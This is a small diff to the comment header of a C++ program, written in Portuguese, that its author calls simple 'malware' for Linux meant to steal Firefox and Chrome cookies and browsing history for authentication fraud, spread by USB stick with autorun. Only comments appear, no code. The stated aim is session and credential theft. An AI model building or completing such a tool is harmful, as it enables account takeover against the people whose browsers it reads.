@@ -1,9 +1,11 @@
+// O malware ainda n esta completo ... 
 //SIMPLES "MALWARE" EM C++ .
 //ALVO SO LINUX
 //OBJETIVO:ROUBAR OS COOKIES E HISTORY DO NAVEGADOR
 //PARA FRAUDE DE AUTENTICAÇÃO.
 //So coloquei o mozilla e chrome pois são os navegadores mais usados atualmente.
 //METODO: PENDRIVER + AUTORUN & MALWARE
+// /dev/sdb1 é o diretorio do pendrive
 //Autor:Nando
 //Data:09/01/2017
 
